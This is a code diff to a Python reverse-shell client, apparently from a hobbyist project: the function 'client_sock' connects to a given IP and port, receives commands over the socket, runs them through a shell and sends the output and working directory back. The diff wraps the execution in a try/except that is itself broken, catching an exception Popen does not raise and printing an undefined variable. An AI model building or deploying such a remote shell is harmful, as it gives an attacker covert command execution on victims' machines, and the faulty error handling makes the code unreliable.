@@ -18,14 +18,18 @@ def client_sock(ip_addr, port):
 
         command = s.recv(1024)
         if command[:2].decode() == 'cd':
+            # Put some error handling bro
             os.chdir(command[3:].decode('utf-8'))
         if len(command) > 0:
+            try:
             # We need to make our own little package to do this (better) lol
-            cmd = subprocess.Popen(command[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-            print(output_str)
+                cmd = subprocess.Popen(command[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str)
+            except subprocess.CalledProcessError:
+                print("Failed: {}".format(e))
             #command = s.recv(1024).decode()
         if command.lower() == "exit":
             s.close()
